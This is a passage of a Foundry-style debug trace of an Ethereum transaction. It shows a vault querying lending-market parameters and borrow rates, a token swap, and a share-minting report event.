    │   │   │   │   │   │   ├─ [7297] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   ├─ [6581] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::transferFrom(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, 1000000000000000000000 [1e21]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, to: 0x2A2C512beAA8eB15495726C235472D82EFFB7A6B, value: 1000000000000000000000 [1e21])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [1508] 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [staticcall]
    │   │   │   │   │   │   ├─ [780] 0x46Ce937a70412dfdCf01F29D6D4fe15adA1FAEB8::balanceOf(0x2A2C512beAA8eB15495726C235472D82EFFB7A6B) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 2520324023841535647786 [2.52e21]
    │   │   │   │   │   │   └─ ← [Return] 2520324023841535647786 [2.52e21]
    │   │   │   │   │   ├─ emit Swap(param0: 0x4e1d81A3E627b9294532e990109e4c21d217376C, param1: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, param2: -1915400181318 [-1.915e12], param3: 1000000000000000000000 [1e21], param4: 3005855850620914697275180803212106 [3.005e33], param5: 31768301748276227 [3.176e16], param6: 210885 [2.108e5])
    │   │   │   │   │   └─ ← [Return] 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffe420940a9ba00000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   │   │   └─ ← [Return] 1915400181318 [1.915e12]
    │   │   │   ├─ [3079] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   └─ ← [Return] 30363683513771595986006474 [3.036e25]
    │   │   │   ├─ [443694] 0xCE2b8e464Fc7b5E58710C24b7e5EBFB6027f29D7::convertToAssets(30363683513771595986006474 [3.036e25]) [staticcall]
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xd0c4173c1dd1f30c5c927c8b9f98294294be1292ebd41e1eafbbcba1028343db]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000056c608e4378c0
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x5ccaa3e4958c08051e26d60f7fd2454516bd981375c2ede584826490dc2e7280) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000005db86f9f4700000000000000000000000000000000000000000000000005960f8538211fc00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000692976c70000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000000913da6da4b42f538b445599b46bb4622342cf52000000000000000000000000b60f728bdce5e3921c0e42c1a6f07a1313d0040e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4b807718ccf367383077da1df57347d73f5163a5f2eea67b5418bf3d6c4171c7]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000007a8a74e63a88df41
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcd2dc555dced7422a3144a4126286675449019366f83e9717be7c2deb3daae3e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000020b406711476000000000000000000000000000000000000000000000001ef6d581dc585c39c0000000000000000000000000000000000000000000000000000159e2cddc1c2000000000000000000000000000000000000000000000001471c2822431b07470000000000000000000000000000000000000000000000000000000069296a370000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x0913DA6Da4b42f538B445599b46Bb4622342Cf52, 0xB60F728BdcE5e3921C0E42c1a6F07A1313D0040e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (35957574276214 [3.595e13], 35699286706126963612 [3.569e19], 23769101746626 [2.376e13], 23570758677370177351 [2.357e19], 1764321847 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000002818a806
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ee7d8bcfb72bc1880d0cf19822eb0a2e6577ab62000000000000000000000000d423d353f890ad0d18532ffaf5c47b0cb943bf470000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x6134b6f30fc70b7fbe09c812e3b24a4f48945ade04e59f00f06a48a72dfc3d2b]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000003076863c5e325992
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x2fb14719030835b8e0a39a1461b384ad6a9c8392550197a7c857cf9fcbd6c534) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000a2601820ae400000000000000000000000000000000000000000000000099c0f082365ae7c70000000000000000000000000000000000000000000000000000077dbb6ed0eb000000000000000000000000000000000000000000000000715d6173c2b5c8410000000000000000000000000000000000000000000000000000000069296aab0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xEE7D8BCFb72bC1880D0Cf19822eB0A2e6577aB62, 0xD423D353f890aD0D18532fFaf5c47B0Cb943bf47, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (11158350334692 [1.115e13], 11079119525379762119 [1.107e19], 8236596908267 [8.236e12], 8168792448935774273 [8.168e18], 1764321963 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000250d4af3
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000ecac9c5f704e954931349da37f60e39f515c11c1000000000000000000000000cc139318686969b9d30dd62aa206725b269da40d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0xb5b837c74fa6806002fd3a23501b416c4fc7547bf974b0637785fa225b3fbff8]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xa0cd6b9d1fcc6baded4f7f8f93697dbe7f24f6e1fc22602a625c7a80b8e8e6ef) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000001277b17479200000000000000000000000000000000000000000000000011648dcd67ed96d7000000000000000000000000000000000000000000000000000000b4cb5f32490000000000000000000000000000000000000000000000000a9f5ac178edcf8f00000000000000000000000000000000000000000000000000000000692803500000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xecAc9C5F704e954931349Da37F60E39f515c11c1, 0xcC139318686969b9D30Dd62aA206725B269DA40d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (1269080475538 [1.269e12], 1253282509667276503 [1.253e18], 776506126921 [7.765e11], 765430248680312719 [7.654e17], 1764229968 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000237f988a
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000b0f70c0bd6fd87dbeb7c10dc692a2a610681707200000000000000000000000083f4197076614efe8e4c37bb9efbfead08d4719f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x115a2c52309574a8b3a9fb502ff331a302403942beaee5db1149ca0fd276f620]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x0e9d558490ed0cd523681a8c51d171fd5568b04311d0906fec47d668fb55f5d9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000055f599b3f7000000000000000000000000000000000000000000000000050ea42e8860930c000000000000000000000000000000000000000000000000000000112b62c49b00000000000000000000000000000000000000000000000001025abedbf6c81d000000000000000000000000000000000000000000000000000000006926dd6e0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xB0F70C0bD6FD87dbEb7C10dC692a2a6106817072, 0x83F4197076614efe8e4c37BB9EFBfeaD08d4719f, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (369192711159 [3.691e11], 364409139627070220 [3.644e17], 73742337179 [7.374e10], 72720319772018717 [7.272e16], 1764154734 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000c98017
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009a6bd7b6fd5c4f87eb66356441502fc7dcdd185b000000000000000000000000d978ce03d8bb0eb3f09cb2a469dbbc25db42f3ae0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x113b019b1a1ae6ebb77894d50fd7fd4bd87f532c42648cd3ec74849ce6a17ce6]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000476d0281656d22c4
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcdaf57d98c2f75bffb8f0d3f7aa79bbacda4a479c47e316aab14af1ca6d85ffc) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000070e1c55dad70000000000000000000000000000000000000000000000006a1a5366185e7bbd00000000000000000000000000000000000000000000000000000615debf4ca30000000000000000000000000000000000000000000000005b57300693fcbbe800000000000000000000000000000000000000000000000000000000692972050000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9A6bd7B6Fd5C4F87eb66356441502fc7dCdd185B, 0xD978CE03d8BB0eb3f09cB2a469DbbC25DB42F3Ae, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (7757186325207 [7.757e12], 7645515015375453117 [7.645e18], 6691001158819 [6.691e12], 6581782185236020200 [6.581e18], 1764323845 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004d8bab52
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000e007ca01894c863d7898045ed5a3b4abf0b18f37000000000000000000000000aa9853c78b92606b21ce57da7f04f301f031aba40000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x29e239c68a4f6dc6a3d25deacb5cfad26fceeee1fcd52545613bfd97aaf9896c]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000786514945491fe7c
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x08f67ef41398456dbc5ff72d43c8b6f7917abfd01498a9fc6c89dabe6eb78b8c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000acf75074ec6000000000000000000000000000000000000000000000000a3584bf474dc2175000000000000000000000000000000000000000000000000000007c82f032921000000000000000000000000000000000000000000000000756e2c6afbf3985500000000000000000000000000000000000000000000000000000000692960890000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xE007CA01894c863d7898045ed5A3B4Abf0b18f37, 0xaa9853c78B92606b21cE57Da7F04F301f031Aba4, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (11886137921222 [1.188e13], 11770241139437478261 [1.177e19], 8556363589921 [8.556e12], 8461749587880941653 [8.461e18], 1764319369 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000046d068aa
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000009893989433e7a383cb313953e4c2365107dc19a70000000000000000000000009b32a1859fe79fe76f8c1b771664b28852c3718c0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x345b7096db6c387717f255f209ff2e8d7c4abcac7effae88e09e9cdc4024e5c1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x76e311d4b0e2e6ae88ad9bab18063452a6d39837d7104c430ff62457b91cb2cb) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000026ffb9a5d8000000000000000000000000000000000000000000000000025312e62207118c00000000000000000000000000000000000000000000000000000002cca8b945000000000000000000000000000000000000000000000000002ab72905913a84000000000000000000000000000000000000000000000000000000006928f2a60000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x9893989433e7a383Cb313953e4c2365107dc19a7, 0x9b32a1859FE79fE76F8C1B771664b28852c3718c, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (167499113944 [1.674e11], 167498390765506956 [1.674e17], 12023544133 [1.202e10], 12023335836793476 [1.202e16], 1764291238 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000095e825
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd36000000000000000000000000aa0362ecc584b985056e47812931270b99c91f9d00000000000000000000000029bdd31828260de15f6431410da3a24c1851d80e0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000aaf96eb9d0d0000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x4ac2d4b58754e8a4005e379d3df2c3373511409c90c276cc5ab0ec77dc392044]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000c89c02a2f58fa5b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0x3a22063bd258f3f75e3135cac4ec53435dfa5b47b3d5173bb8fd5278e6c1b305) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000d3cc875d650000000000000000000000000000000000000000000000000c89c1307e0c2564000000000000000000000000000000000000000000000000000000be9e79d9980000000000000000000000000000000000000000000000000b45e4412f7bd5d7000000000000000000000000000000000000000000000000000000006925fb000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0xAa0362eCC584B985056E47812931270b99C91f9d, 0x29Bdd31828260DE15f6431410da3a24c1851d80e, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 770000000000000000 [7.7e17]), (909669522789 [9.096e11], 903465614281811300 [9.034e17], 818702571928 [8.187e11], 812306276430894551 [8.123e17], 1764096768 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003cc9c1c4
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd3600000000000000000000000093fec6639717b6215a48e5a72a162c50dcc40d680000000000000000000000002c6204aedcc71a4eb373820248f513a4e91be62f0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x47fb97f2ba64cf8699ba25ede739a84eaa55353414173aa6ee718cee7797a3b2]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000002d53abb28286256b
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xcfac40b9f06194a33d9526f73642f6849b908c2b6d8669ad9d2d4a3e7dcb017a) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000002fc999e29b60000000000000000000000000000000000000000000000002d53ac26ecd8ad6b000000000000000000000000000000000000000000000000000002ad7095e979000000000000000000000000000000000000000000000000289b4b87ecff124200000000000000000000000000000000000000000000000000000000692960330000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x93Fec6639717b6215A48E5a72a162C50DCC40d68, 0x2c6204aEDCC71A4EB373820248F513A4e91be62F, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (3283932293558 [3.283e12], 3266143437956099435 [3.266e18], 2943941470585 [2.943e12], 2926015430076076610 [2.926e18], 1764319283 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000004650130b
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000007fb4d0f51544f24f385a421db6e7d4fc71ad8e5c0000000000000000000000001c5f3862c913e015ed0a2a9d71e13be74101f47d0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000bef55718ad60000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x8f8a620965b5e63c41a83de86019fb16d5a0ff0ebc3ec00e35c582be79d5b515]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xd3b3c992070b5a6271b11acde46cdad575e4187e499782e084d73e523153f1ed) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000022e08dabb5000000000000000000000000000000000000000000000000016cbe8086f824b300000000000000000000000000000000000000000000000000000000dfa74b370000000000000000000000000000000000000000000000000008d435b457b0f9000000000000000000000000000000000000000000000000000000006928fa110000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5356] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x7Fb4D0f51544F24F385a421Db6e7D4fC71Ad8e5C, 0x1c5f3862c913E015eD0a2A9d71E13BE74101F47d, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 860000000000000000 [8.6e17]), (149796268981 [1.497e11], 102666350752179379 [1.026e17], 3752282935 [3.752e9], 2485126937686265 [2.485e15], 1764293137 [1.764e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000015235f9e
    │   │   │   │   ├─ [10963] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::idToMarketParams(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000203a662b0bd271a6ed5a60edfbd04bfce608fd360000000000000000000000005bff88ca1442c2496f7e475e9e7786383bc070c000000000000000000000000091a3030277b20c084aa83d4f8c8a714fd4e054ab0000000000000000000000004f708c0ae7ded3d74736594c2109c2e3c065b4280000000000000000000000000000000000000000000000000cb2bba6f17b8000
    │   │   │   │   ├─ [3423] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::extSloads([0x91666dfc9cfeb8df5519318bc5b3d4d398a890ba98863cda55dd0c556a182672]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [6929] 0xD50F2DffFd62f94Ee4AEd9ca05C61d0753268aBc::market(0xe4c5c5b802accd32c67253005b6e9df4f5c57c2426a9322c5e12f84981adf8c9) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000007a32e000000000000000000000000000000000000000000000000000000746a528800000000000000000000000000000000000000000000000000000000000006dfe400000000000000000000000000000000000000000000000000000068c617140000000000000000000000000000000000000000000000000000000000690a5adb0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [5374] 0x4F708C0ae7deD3d74736594C2109C2E3c065B428::borrowRateView((0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36, 0x5Bff88cA1442c2496f7E475E9e7786383Bc070c0, 0x91A3030277B20C084Aa83d4f8C8a714Fd4E054AB, 0x4F708C0ae7deD3d74736594C2109C2E3c065B428, 915000000000000000 [9.15e17]), (500526 [5.005e5], 500000000000 [5e11], 450532 [4.505e5], 450000000000 [4.5e11], 1762286299 [1.762e9], 0)) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000466d04f2
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001bceed7d669b
    │   │   │   ├─ [1486] 0x203A662b0BD271A6ed5a60EdFbd04bFce608FD36::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [staticcall]
    │   │   │   │   ├─ [758] 0x5e875267f65537768435C3C6C81cd313a570B422::balanceOf(0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1915400181318 [1.915e12]
    │   │   │   │   └─ ← [Return] 1915400181318 [1.915e12]
    │   │   │   ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   │   │   │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   │   │   │   └─ ← [Return] 30573573712348 [3.057e13]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000001d8ce43cbce1
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12, value: 1902636222938 [1.902e12])
    │   │   ├─ emit Reported(: 1917388100357 [1.917e12], : 0, : 0, : 0)
    │   │   └─ ← [Return] 1917388100357 [1.917e12], 0
    │   └─ ← [Return] 1917388100357 [1.917e12], 0
    ├─ [908] 0x78EC25FBa1bAf6b7dc097Ebb8115A390A2a4Ee12::totalAssets() [staticcall]
    │   ├─ [507] 0xD377919FA87120584B21279a491F82D5265A139c::totalAssets() [delegatecall]
    │   │   └─ ← [Return] 32490961812705 [3.249e13]
